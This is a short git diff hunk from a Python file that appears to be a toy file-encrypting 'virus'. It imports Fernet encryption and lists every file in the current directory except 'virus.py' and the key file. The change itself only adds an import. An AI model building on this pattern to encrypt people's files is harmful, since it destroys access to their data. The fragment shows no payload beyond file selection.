@@ -1,4 +1,5 @@
 import os
+from sys import exit
 from cryptography.fernet import Fernet
 
 files = [f for f in os.listdir() if (f != "virus.py" and f != "Secrets.key" and os.path.isfile(f))]
